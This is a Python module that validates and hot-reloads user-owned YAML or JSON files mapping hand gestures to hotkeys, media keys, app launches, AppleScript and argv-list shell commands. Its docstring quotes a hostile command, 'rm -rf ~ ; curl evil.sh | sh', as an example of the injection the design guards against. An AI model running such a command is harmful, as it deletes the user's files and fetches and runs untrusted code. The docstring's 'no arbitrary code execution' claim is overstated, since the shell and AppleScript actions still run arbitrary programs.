"""Declarative gesture → action bindings.

Replaces the hardcoded GESTURE_MAP dict.  Bindings now live in a YAML (or JSON)
file the user owns, which is also the artifact the web command builder exports.

Design constraints
------------------
**No arbitrary code execution.**  Every action is one of a closed set of typed
kinds, each validated against a schema before anything runs.  There is no
`eval`, no `exec`, and no shell-string action -- `shell` takes an argv *list*
and is executed without a shell, so a config file cannot smuggle in
`rm -rf ~ ; curl evil.sh | sh` through a quoting trick.  A config file is
untrusted input: it may arrive by download from a website, and it is validated
like untrusted input.

**Fail loudly at load, never at gesture time.**  A typo in a key name should
stop startup with a message naming the gesture and the field, not silently
produce a gesture that does nothing when performed six minutes later.

Format
------
::

    version: 1
    neutral_label: 0
    gestures:
      - label: 1
        name: Spotlight
        description: Open Spotlight search
        action:
          type: hotkey
          keys: [command, space]
"""

from __future__ import annotations

import json
import re
import threading
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional, Sequence

from gestureflow.utils import PROJECT_ROOT

SCHEMA_VERSION = 1

DEFAULT_COMMANDS_PATH = PROJECT_ROOT / "configs" / "commands.default.yaml"
USER_COMMANDS_PATH = Path.home() / ".gestureflow" / "commands.yaml"

# Keys pyautogui.hotkey / press accept. Restricting to a known set means a
# typo is a load-time error rather than a hotkey that silently does nothing.
VALID_KEYS = frozenset({
    "command", "cmd", "ctrl", "control", "alt", "option", "shift", "fn",
    "enter", "return", "tab", "space", "esc", "escape", "backspace", "delete",
    "up", "down", "left", "right", "home", "end", "pageup", "pagedown",
    "capslock", "insert",
    *(f"f{i}" for i in range(1, 21)),
    *"abcdefghijklmnopqrstuvwxyz",
    *"0123456789",
    "-", "=", "[", "]", "\\", ";", "'", ",", ".", "/", "`",
})

MEDIA_ACTIONS = frozenset({
    "playpause", "next", "previous",
    "volumeup", "volumedown", "mute",
})

ACTION_TYPES = frozenset({
    "hotkey", "keypress", "media", "launch", "applescript", "shell",
})

_APP_NAME_RE = re.compile(r"^[A-Za-z0-9 ._+-]{1,64}$")


class CommandConfigError(ValueError):
    """Raised when a command config is malformed. Message names the culprit."""


# ---------------------------------------------------------------------------
# Action model
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class Action:
    type: str
    keys: tuple = ()
    key: str = ""
    media: str = ""
    app: str = ""
    script: str = ""
    argv: tuple = ()

    def to_dict(self) -> Dict[str, Any]:
        if self.type == "hotkey":
            return {"type": "hotkey", "keys": list(self.keys)}
        if self.type == "keypress":
            return {"type": "keypress", "key": self.key}
        if self.type == "media":
            return {"type": "media", "action": self.media}
        if self.type == "launch":
            return {"type": "launch", "app": self.app}
        if self.type == "applescript":
            return {"type": "applescript", "script": self.script}
        if self.type == "shell":
            return {"type": "shell", "argv": list(self.argv)}
        raise CommandConfigError(f"unknown action type {self.type!r}")

    def describe(self) -> str:
        if self.type == "hotkey":
            return " + ".join(self.keys)
        if self.type == "keypress":
            return f"press {self.key}"
        if self.type == "media":
            return f"media: {self.media}"
        if self.type == "launch":
            return f"open {self.app}"
        if self.type == "applescript":
            first = self.script.strip().splitlines()[0] if self.script else ""
            return f"applescript: {first[:40]}"
        if self.type == "shell":
            return "shell: " + " ".join(self.argv)
        return self.type


@dataclass(frozen=True)
class Binding:
    label: int
    name: str
    action: Action
    description: str = ""

    def to_dict(self) -> Dict[str, Any]:
        out: Dict[str, Any] = {
            "label": self.label,
            "name": self.name,
            "action": self.action.to_dict(),
        }
        if self.description:
            out["description"] = self.description
        return out


@dataclass
class CommandSet:
    """An immutable-ish set of gesture bindings, keyed by model label."""

    bindings: Dict[int, Binding] = field(default_factory=dict)
    neutral_label: int = 0
    source: Optional[Path] = None
    version: int = SCHEMA_VERSION

    def has(self, label: int) -> bool:
        return int(label) in self.bindings

    def get(self, label: int) -> Optional[Binding]:
        return self.bindings.get(int(label))

    def name_for(self, label: int) -> str:
        binding = self.get(label)
        return binding.name if binding else f"gesture {label}"

    def labels(self) -> List[int]:
        return sorted(self.bindings)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "version": self.version,
            "neutral_label": self.neutral_label,
            "gestures": [self.bindings[label].to_dict()
                         for label in self.labels()],
        }

    def to_yaml(self) -> str:
        return dump_yaml(self.to_dict())


# ---------------------------------------------------------------------------
# Validation
# ---------------------------------------------------------------------------

def _require(condition: bool, message: str) -> None:
    if not condition:
        raise CommandConfigError(message)


def parse_action(raw: Any, where: str) -> Action:
    _require(isinstance(raw, dict), f"{where}: 'action' must be a mapping")

    kind = raw.get("type")
    _require(isinstance(kind, str) and kind,
             f"{where}: 'action.type' is required")
    _require(kind in ACTION_TYPES,
             f"{where}: unknown action type {kind!r}. "
             f"Valid types: {', '.join(sorted(ACTION_TYPES))}")

    if kind == "hotkey":
        keys = raw.get("keys")
        _require(isinstance(keys, (list, tuple)) and len(keys) >= 1,
                 f"{where}: hotkey needs a non-empty 'keys' list")
        _require(len(keys) <= 5,
                 f"{where}: hotkey accepts at most 5 keys, got {len(keys)}")
        normalized = []
        for k in keys:
            _require(isinstance(k, str), f"{where}: hotkey keys must be strings")
            low = k.strip().lower()
            _require(low in VALID_KEYS,
                     f"{where}: {k!r} is not a recognized key name")
            normalized.append(low)
        return Action(type="hotkey", keys=tuple(normalized))

    if kind == "keypress":
        key = raw.get("key")
        _require(isinstance(key, str) and key.strip(),
                 f"{where}: keypress needs a 'key'")
        low = key.strip().lower()
        _require(low in VALID_KEYS, f"{where}: {key!r} is not a recognized key")
        return Action(type="keypress", key=low)

    if kind == "media":
        media = raw.get("action")
        _require(isinstance(media, str), f"{where}: media needs an 'action'")
        low = media.strip().lower()
        _require(low in MEDIA_ACTIONS,
                 f"{where}: unknown media action {media!r}. "
                 f"Valid: {', '.join(sorted(MEDIA_ACTIONS))}")
        return Action(type="media", media=low)

    if kind == "launch":
        app = raw.get("app")
        _require(isinstance(app, str) and app.strip(),
                 f"{where}: launch needs an 'app' name")
        app = app.strip()
        # Anchored character-class match: an app name cannot contain quotes,
        # semicolons, or newlines that would change the meaning of the
        # `open -a` invocation it ends up in.
        _require(bool(_APP_NAME_RE.match(app)),
                 f"{where}: {app!r} is not a valid application name "
                 f"(letters, digits, spaces, . _ + - only)")
        return Action(type="launch", app=app)

    if kind == "applescript":
        script = raw.get("script")
        _require(isinstance(script, str) and script.strip(),
                 f"{where}: applescript needs a 'script'")
        _require(len(script) <= 4000,
                 f"{where}: applescript is longer than the 4000-char limit")
        return Action(type="applescript", script=script)

    # kind == "shell"
    argv = raw.get("argv")
    _require(isinstance(argv, (list, tuple)) and len(argv) >= 1,
             f"{where}: shell needs a non-empty 'argv' list. "
             f"Note this is an argument list, not a command string -- "
             f"it is run without a shell, so pipes and redirects do not apply.")
    _require(all(isinstance(a, str) for a in argv),
             f"{where}: every argv entry must be a string")
    _require(len(argv) <= 32, f"{where}: argv is limited to 32 entries")
    return Action(type="shell", argv=tuple(argv))


def parse_commands(raw: Any, source: Optional[Path] = None) -> CommandSet:
    """Validate a parsed config document into a CommandSet."""
    where = f"{source}" if source else "<config>"
    _require(isinstance(raw, dict), f"{where}: top level must be a mapping")

    version = raw.get("version", SCHEMA_VERSION)
    _require(isinstance(version, int),
             f"{where}: 'version' must be an integer")
    _require(version == SCHEMA_VERSION,
             f"{where}: config version {version} is not supported by this "
             f"build (expected {SCHEMA_VERSION})")

    neutral = raw.get("neutral_label", 0)
    _require(isinstance(neutral, int) and neutral >= 0,
             f"{where}: 'neutral_label' must be a non-negative integer")

    gestures = raw.get("gestures")
    _require(isinstance(gestures, list) and gestures,
             f"{where}: 'gestures' must be a non-empty list")

    bindings: Dict[int, Binding] = {}
    for i, entry in enumerate(gestures):
        item = f"{where}: gestures[{i}]"
        _require(isinstance(entry, dict), f"{item} must be a mapping")

        label = entry.get("label")
        _require(isinstance(label, int) and not isinstance(label, bool),
                 f"{item}: 'label' must be an integer")
        _require(label >= 0, f"{item}: 'label' must be non-negative")
        _require(label != neutral,
                 f"{item}: label {label} is the neutral label, which is the "
                 f"'no gesture' state and cannot have an action bound to it")
        _require(label not in bindings,
                 f"{item}: label {label} is already bound to "
                 f"{bindings.get(label).name if label in bindings else ''!r}")

        name = entry.get("name")
        _require(isinstance(name, str) and name.strip(),
                 f"{item}: 'name' is required")
        _require(len(name) <= 64, f"{item}: 'name' is limited to 64 characters")

        description = entry.get("description", "")
        _require(isinstance(description, str),
                 f"{item}: 'description' must be a string")

        action = parse_action(entry.get("action"), f"{item} ({name})")
        bindings[label] = Binding(label=label, name=name.strip(),
                                  action=action,
                                  description=description.strip())

    return CommandSet(bindings=bindings, neutral_label=neutral,
                      source=source, version=version)


# ---------------------------------------------------------------------------
# Loading
# ---------------------------------------------------------------------------

def _parse_document(text: str, path: Path) -> Any:
    if path.suffix.lower() == ".json":
        try:
            return json.loads(text)
        except json.JSONDecodeError as exc:
            raise CommandConfigError(f"{path}: invalid JSON — {exc}") from exc

    try:
        import yaml
    except ImportError as exc:
        raise CommandConfigError(
            f"{path}: PyYAML is required to read YAML configs. "
            f"Install it with 'pip install pyyaml', or use a .json config."
        ) from exc

    try:
        # safe_load, never load: a config file must not be able to construct
        # arbitrary Python objects.
        return yaml.safe_load(text)
    except yaml.YAMLError as exc:
        raise CommandConfigError(f"{path}: invalid YAML — {exc}") from exc


def resolve_commands_path(explicit: Optional[Path] = None) -> Path:
    """Pick the config to load: explicit > user's > shipped default."""
    if explicit is not None:
        path = Path(explicit).expanduser()
        if not path.exists():
            raise CommandConfigError(f"No command config at {path}")
        return path
    if USER_COMMANDS_PATH.exists():
        return USER_COMMANDS_PATH
    return DEFAULT_COMMANDS_PATH


def load_commands(path: Optional[Path] = None) -> CommandSet:
    resolved = resolve_commands_path(path)
    if not resolved.exists():
        raise CommandConfigError(
            f"No command config found. Expected one of:\n"
            f"  {USER_COMMANDS_PATH}\n"
            f"  {DEFAULT_COMMANDS_PATH}"
        )
    text = resolved.read_text()
    return parse_commands(_parse_document(text, resolved), source=resolved)


def load_commands_from_string(text: str, fmt: str = "yaml") -> CommandSet:
    """Parse a config held in memory. Used by the bridge and by tests."""
    fake = Path(f"<string>.{'json' if fmt == 'json' else 'yaml'}")
    if fmt == "json":
        raw = json.loads(text)
    else:
        import yaml
        raw = yaml.safe_load(text)
    return parse_commands(raw, source=None)


class CommandReloader:
    """Reloads the command config when its file changes on disk.

    mtime polling rather than filesystem events: one `stat` a second is
    cheaper than a watcher dependency, and the reaction time a human needs
    after saving a file is nowhere near a second.
    """

    def __init__(self, path: Path, interval: float = 1.0) -> None:
        self.path = Path(path)
        self.interval = interval
        self._lock = threading.Lock()
        self._mtime = self._current_mtime()
        self._commands = load_commands(self.path)
        self._last_check = 0.0

    def _current_mtime(self) -> float:
        try:
            return self.path.stat().st_mtime
        except OSError:
            return 0.0

    @property
    def commands(self) -> CommandSet:
        with self._lock:
            return self._commands

    def poll(self, now: float) -> bool:
        """Reload if the file changed. Returns True if it did."""
        if now - self._last_check < self.interval:
            return False
        self._last_check = now

        mtime = self._current_mtime()
        if mtime == self._mtime:
            return False

        try:
            fresh = load_commands(self.path)
        except CommandConfigError as exc:
            # Keep running the last config that parsed. Swapping in a broken
            # config, or exiting, would both be worse than ignoring the edit.
            print(f"[commands] Reload failed, keeping previous config: {exc}")
            self._mtime = mtime
            return False

        with self._lock:
            self._commands = fresh
        self._mtime = mtime
        print(f"[commands] Reloaded {self.path}")
        return True


# ---------------------------------------------------------------------------
# Serialization
# ---------------------------------------------------------------------------

def dump_yaml(data: Dict[str, Any]) -> str:
    try:
        import yaml
    except ImportError:
        return json.dumps(data, indent=2)
    return yaml.safe_dump(data, sort_keys=False, default_flow_style=False)
